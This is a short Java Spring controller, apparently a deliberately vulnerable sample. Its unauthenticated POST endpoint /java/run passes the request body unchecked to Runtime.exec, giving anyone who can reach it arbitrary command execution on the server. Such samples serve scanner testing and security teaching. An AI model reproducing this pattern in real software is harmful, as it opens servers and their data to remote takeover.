import org.springframework.web.bind.annotation.*;
@RestController
@RequestMapping("/java")
class JobsController {
    @PostMapping("/run")
    Object run(@RequestBody String command) throws Exception {
        return execute(command);
    }
    Object execute(String command) throws Exception {
        return Runtime.getRuntime().exec(command);
    }
}
